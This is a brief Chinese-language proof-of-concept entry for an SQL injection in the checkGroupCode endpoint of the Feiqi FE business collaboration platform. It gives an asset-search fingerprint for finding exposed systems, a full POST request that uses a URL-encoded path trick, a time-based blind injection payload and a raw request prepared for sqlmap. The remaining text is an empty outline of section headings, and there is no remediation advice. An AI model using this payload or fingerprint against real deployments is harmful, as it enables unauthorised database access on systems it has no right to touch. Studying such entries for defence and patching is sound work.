# 飞企互联FE业务协作平台checkGroupCode存在SQL注入漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`POST /docexchangeManage/checkGroupCode.js%70 HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=4B15C07393E691675DB622D9977C79FC`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
code=whoami11';WAITFOR DELAY '0:0:5'--

sqlmap
POST /docexchangeManage/checkGroupCode.js%70 HTTP/1.1
Host:
Cookie: JSESSIONID=4B15C07393E691675DB622D9977C79FC
Content-Type: application/x-www-form-urlencoded
code=whoami11
```

**其他**
- 飞企互联FE业务协作平台checkGroupCode存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台